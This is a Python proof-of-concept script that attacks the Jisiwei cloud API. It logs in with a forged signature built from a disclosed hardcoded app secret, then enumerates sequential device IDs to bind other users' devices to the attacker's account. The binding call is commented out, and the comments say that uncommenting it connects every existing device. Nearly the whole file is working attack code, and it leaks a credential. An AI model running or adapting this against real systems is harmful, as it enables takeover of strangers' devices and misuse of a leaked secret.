import requests

# The *sign* variable is based on the on the time variable, 
# random state variable, password, and username. 
# So don't change the *sign* variable. If you catch the HTTP request from a login,
# you could just take that time, state, and sign if you would like to use another account.
# The *sign* variable is built like this: time + username + password + appsecret + appid + "" + state.
# *Appsecret* is: DdikRxptqXcZKyvVzvSDdMTETkwbwFf39zanN86B and *appid* is: 1422957080
# And then gone through a md5 hash.
# The *state* variable is based on this java line: Math.round(Math.random() * 8.999999999999999E15D + 100000.0D)

# Information needed for login
t = "2020-07-06 10:51:15"
rand1_state = "2517928090239350"
username = 'hackmanhacker8@gmail.com'
password = 'proofofconcept'
appid = '1422957080'
sign = '397c6b47f5591ed9101c85016dfb9896'
lan = 'en'
payload = { 
	'username': username, 
	'password': password, 
	'timestamp': t,
	'appid': appid, 
	'state': rand1_state, 
	'sign': sign, 
	'lan': lan 
	}

# Login request
r = requests.post("http://yun.jisiwei.com/api/user/login", data=payload)

# When we are logged in we can start generating device IDs.
if r.status_code == requests.codes['ok']:
	# Get the userid, user data, dev data and access token that is needed for the 
	# API for adding devices to the logged in account
	a = r.json()
	userid = a['userid']
	user_data = a['user_data']
	dev_data = a['dev_data']
	access_token = a['access_token']
	devname = 'PY'
	rand2_state = '4541911032571890'

	for i in range(1000000):
		currentID = "JSW" + str(i).zfill(6)
		parameters = {	
			'devid': currentID, 
			'remark': devname,
			'userid': userid, 
			'access_token': access_token,
			'lan': lan, 
			'state': rand2_state 
			}
		if currentID == "JSW013294":
			# If the row below is uncommented you will
			# connect all devices existing to your account	
			#s = requests.get("http://yun.jisiwei.com/api/dev", params=parameters)
			print("Hacked!")
			break
					
	print("Gone through all the device IDs!")
else:
	print("ERROR: " + r.text())